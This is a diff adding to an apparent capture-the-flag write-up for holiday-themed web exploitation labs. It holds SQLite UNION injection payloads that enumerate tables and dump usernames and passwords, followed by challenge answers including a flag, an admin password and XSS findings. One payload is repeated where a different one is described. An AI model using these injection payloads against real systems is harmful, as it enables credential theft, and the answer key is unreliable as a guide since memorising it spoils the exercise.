@@ -64,9 +64,54 @@ Without using directory brute forcing, what's Santa's secret login panel?
 
 ```/santapanel```
 
+First of all, try payload is ```' union select 1,2--```, we can see two columns in this database. So it is SQLi union base
+Next step, we should determine what type of database and i know it is SQLite since i try payload ```' union select 1, sqlite_version()--``` then i see version of database. Next step is demtermine tables in this database. My payload is ```'UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--```. As can we seen, there are 3 tables in this databases. Let's look for password for admin user. 
+
+![alt text](image.png)
+
+Because database have a table name 'users', reading entries is quite easy. My payload ```' UNION SELECT 1, group_concat(username || "," || password) from users--```
+
+![alt text](image-1.png)
+
+Let's look for flag. There is a table name hidden_table which contain flag. I use thi payload to know 
+
+```'UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='hidden_table'--```
+
+To read flag try payload: ```'UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='hidden_table'--```
+
+Another way, you can use SQLmap
+
 How many entries are there in the gift database?
 
-```a```
+```22```
+
+What did Paul ask for?
+
+```Github Ownership```
+
+What is the flag?
+
+```thmfox{All_I_Want_for_Christmas_Is_You}```
+
+What is admin's password?
+
+```EhCNSWzzFP6sc7gB```
+
+# [Day 6] Web Exploitation Be careful with what you wish on a Christmas night
+
+What vulnerability type was used to exploit the application?
+
+```Stored cross-site scripting```
+
+What query string can be abused to craft a reflected XSS?
+
+```q```
+
+Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?
+
+```2```
+
+
 
 
 
